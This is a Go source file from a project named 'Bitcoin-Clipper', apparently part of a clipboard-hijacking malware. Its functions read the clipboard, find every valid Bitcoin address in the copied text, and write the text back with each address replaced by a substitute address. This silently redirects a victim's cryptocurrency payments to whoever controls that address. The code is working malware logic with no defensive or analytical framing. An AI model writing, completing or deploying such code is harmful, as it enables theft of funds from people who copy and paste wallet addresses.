package helpers

import (
	"strings"

	"golang.design/x/clipboard"
	"Bitcoin-Clipper/helpers/bitcoin" // Your own help package for checking addresses
)

// SetContents sets the contents of the clipboard.
func SetContents(content string) bool {
	// This function writes the content to the clipboard as plain text.
	clipboard.Write(clipboard.FmtText, []byte(content))
	return true
}

// Contents Reads the current contents of the clipboard.
func Contents() *string {
	content := clipboard.Read(clipboard.FmtText)
	if content == nil {
		return nil
	}
	s := string(content)
	trimmed := strings.TrimSpace(s)
	if trimmed == "" {
		return nil
	}
	return &s
}

// SetSentence performs the logic of replacing addresses within a sentence.
func SetSentence(content string, switchAddress string) bool {
	words := strings.Fields(content)
	var newSentence strings.Builder

	for i, word := range words {
		// Checking the validity of the address with your own helper
		if bitcoin.IsValidAddress(word) {
			newSentence.WriteString(switchAddress)
		} else {
			newSentence.WriteString(word)
		}

		// If it's not the last word, add a space.
		if i < len(words)-1 {
			newSentence.WriteString(" ")
		}
	}

	return SetContents(newSentence.String())
}
